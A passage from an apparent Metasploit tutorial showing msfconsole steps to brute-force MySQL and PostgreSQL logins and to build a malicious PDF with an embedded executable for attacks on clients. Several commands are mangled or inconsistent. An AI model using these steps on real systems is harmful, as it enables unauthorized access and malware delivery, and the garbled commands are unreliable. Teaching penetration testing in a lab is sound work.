    Through the previous introduction to the Metasploit framework, readers should
    understand the basic attack steps. Different attack modules use different steps
    and require users to use them flexibly. However, the basic idea is the same. Users
    first search for penetration testing modules that can exploit their vulnerabilities,
    then load the attack payload, and then perform penetration testing. In order to
    make users more proficient in the entire penetration testing process, this section
    will introduce several attack examples.


    ## Penetration attack on MySQL database service


    MySQL is a relational database management system. In terms of web server applications,
    MySQL database is usually the best choice for users. If the administrator configures
    improperly, there may be vulnerabilities, such as weak passwords, incorrect user
    rights configuration, etc. At this point, the penetration tester can try to perform
    penetration testing on it. In the MSF control terminal, an auxiliary module `mysql_login`
    is provided, which can be used to crack weak passwords. The following will introduce
    the use of this module to implement penetration testing on MySQL database services.


    ### Use `mysql_login` module to penetrate the MySQL database service.


    The specific steps are as follows:


    1) Use the `mysql_login` module.

    The execution command is as follows:

    ```

    msf5> use auxiliary/scanner/mysql/mysql_login

    msf5 auxiliary(scanner/mysql/mysql_login)>

    ```


    2) View module configuration options.

    The execution command is as follows:

    ```

    msf5 auxiliary(scanner/mysql/mysql_login)> show options

    ```

    Module options (auxiliary/scanner/mysql/mysql_login):

    From the output information, you can see all the configuration options parameters.
    Among them, there are several options that must be configured. Next, it will be
    configured.


    3) Configure module option parameters.

    The execution command is as follows:

    ```

    msf5 auxiliary(scanner/mysql/mysql_login)> set RHOSTS 192.168.29.215 USERPASS_FILE
    => /root/passwords.txt

    ```

    It can be seen from the output information that the module option parameters have
    been successfully set.


    4) Implement penetration testing.

    The execution command is as follows:

    ```

    msf5 auxiliary(scanner/mysql/mysql_login) exploit

    ```

    Auxiliary module execution completed.

    It can be seen from the output information that successive attempts to connect
    to the MySQL server using the username and password in the specified username/password
    file. After trying all the user names and passwords, I found a valid MySQL database
    user and password. The user name is `root` and the password is `123456`.


    # Chapter 31: Advanced Attacking using Metasploit


    ![](images/00009.jpeg) ![](images/00008.jpeg)


    ## Penetration attacks on PostgreSQL database services


    PostgerSQL is a free object-relational database service (database management system).
    In some cases, users can also use the database service to store data, such as
    Metasploit. The following will introduce the use of `postgrs_login` module to
    implement penetration testing on PostgreSQL database services.


    ### Use `postgres_login` module to implement penetration attacks on PostgreSQL
    database services.


    The specific steps are as follows:


    1) Select the `postgres_login` module.

    The execution command is as follows:

    ```

    msf5> use auxiliary/scanner/postgres/postgres_login

    msf5 auxiliary(scanner/postgres/postgres_login)>

    ```


    2) View the configurable option parameters.

    The execution command is as follows:

    ```

    msf5 auxiliary(scanner/postgres/postgres_login)> show options

    ```

    From the output information, you can see all the configuration options parameters.
    Next, all option parameters will be configured.


    3) Configure `RHOSTS` option parameters.

    The execution command is as follows:

    ```

    msf5 auxiliary(scanner/postgres/postgres_login)> set RHOSTS 192.168.29.223 RHOSTS
    => 192.168.29.225

    ```


    4) Implement penetration testing.

    The execution command is as follows:

    ```

    msf5 auxiliary(scanner/postgres/postgres_login)> exploit

    msf5 auxiliary (scanner/postgres/postgres_login)>

    ```

    As you can see from the output information, a valid username and password were
    found, both of which are `postgres`.


    ## Pdf Attacks using Metasploit


    PDF is a file format. This type of file is widely used and easy to transfer. The
    penetration testing methods introduced earlier are all active implementations
    of penetration testing. If the target host does not monitor the server port, you
    need to use passive penetration testing. At this point, you can try to send a
    virus-containing PDF file to the client to perform passive attacks. The following
    will introduce the creation of PDF files with viruses to achieve passive penetration
    testing attacks.


    ### Use Adobe PDF Embedded EXE module to create PDF virus files.


    The specific steps are as follows:


    1) Use `adobe_pdf_embedded_exe` module.

    The execution command is as follows:

    ```

    msf> use exploit/windows/fileformat/adobe_pdf_embedded_exe

    msf5 exploit(windows/fileformat/adobe_pdf_embedded_exe)>

    ```


    2) View the available options of `adobe_pdf_embedded_exe` module.

    The execution command is as follows:

    ```

    msf exploit(adobe_pdf_embedded_exe)> show options

    ```

    The above information shows all the options available for the `adobe_pdf_embedded_exe`
    module. From the information output above, you can see that the default PDF virus
    file used is `template.pdf`, and the output file name is `evil.pdf`. If users
    do not want to use the default PDF file, they can specify their own virus file
    and output file.


    3) Set the name of the PDF file the user wants to generate.

    The execution command is as follows:

    ```

    msf exploit(adobe_pdf_embedded_exe)> set FILENAME test.pdf

    ```


    4) Set the `INFILENAME` option. In order to use the PDF file, use this option
    to specify the location of the PDF file accessed by the user. If the user does
    not have a suitable attack file, the default `template.pdf` can also be used,
    and there is no need to configure this option.

    The execution command is as follows:

    ```

    msf exploit(adobe_pdf_embedded_exe)> set INFILENAME /root/evil.pdf

    ```

    Note: Root cannot be included in the PDF file specified here. Otherwise, the corresponding
    PDF file with virus cannot be generated.


    5) Generate PDF virus files.

    The execution command is as follows:

    ```

    msf exploit(adobe_pdf_embedded_exe)> exploit

    ```

    The output information shows that the `test.pdf` file has been generated and saved
